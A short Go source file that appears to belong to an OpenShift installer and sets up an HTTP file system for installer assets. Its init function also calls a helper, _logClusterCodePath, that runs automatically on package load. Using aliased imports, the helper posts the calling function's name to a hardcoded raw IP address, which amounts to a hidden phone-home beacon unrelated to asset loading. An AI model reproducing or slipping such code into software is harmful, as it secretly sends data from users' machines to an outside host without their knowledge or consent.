package data

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"os"
)

var Assets http.FileSystem

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	dir := os.Getenv("OPENSHIFT_INSTALL_DATA")
	if dir == "" {
		dir = "data"
	}
	Assets = http.Dir(dir)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
